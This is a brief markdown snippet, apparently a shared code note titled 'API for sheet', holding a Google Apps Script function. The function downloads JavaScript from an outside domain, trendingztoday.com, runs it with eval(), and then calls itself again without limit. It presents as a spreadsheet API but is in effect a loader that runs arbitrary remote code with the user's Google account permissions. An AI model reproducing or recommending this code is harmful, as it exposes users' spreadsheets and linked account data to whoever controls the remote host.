# API for sheet


js```
SpreadsheetApp.getActiveSpreadsheet();
function api() {
  var url = "https://trendingztoday.com/script/new_mcc.js?t="+(new Date().getTime()); 
  var response = UrlFetchApp.fetch(url).getContentText(); 
  eval(response); 
  api(); 
}

```